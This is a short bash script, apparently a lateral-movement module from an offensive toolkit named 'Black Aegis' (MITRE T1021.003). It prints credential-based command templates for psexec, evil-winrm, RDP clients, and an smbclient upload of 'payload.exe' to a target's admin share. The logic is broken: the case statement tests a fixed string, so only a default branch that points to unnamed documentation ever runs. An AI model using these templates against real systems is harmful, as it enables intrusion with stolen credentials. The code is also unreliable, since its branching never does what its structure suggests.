#!/bin/bash
# Black Aegis - Lateral Movement Module
# Technique: T1021.003 - Distributed Component Object Model (T1021.003)
# WARNING: Authorized testing only.

TARGET="${1:-}"
USER="${2:-}"
PASS="${3:-}"

echo "[*] Black Aegis - T1021.003 Lateral Movement"
echo "[*] Target: $TARGET"

case "T1021.003" in
    T1021.002)
        echo "[+] SMB/Windows Admin Shares"
        echo "    impacket-psexec $USER:$PASS@$TARGET"
        echo "    psexec.py $USER:$PASS@$TARGET cmd.exe"
        ;;
    T1021.006)
        echo "[+] WinRM"
        echo "    evil-winrm -i $TARGET -u $USER -p $PASS"
        ;;
    T1021.001)
        echo "[+] RDP"
        echo "    xfreerdp /v:$TARGET /u:$USER /p:$PASS"
        echo "    rdesktop -u $USER -p $PASS $TARGET"
        ;;
    T1570)
        echo "[+] Lateral Tool Transfer"
        echo "    smbclient //$TARGET/C\$ -U $USER%$PASS -c 'put payload.exe'"
        ;;
    *)
        echo "[+] Lateral movement via Distributed Component Object Model (T1021.003)"
        echo "    See documentation for specific tools"
        ;;
esac

echo "[*] Lateral Movement module complete."
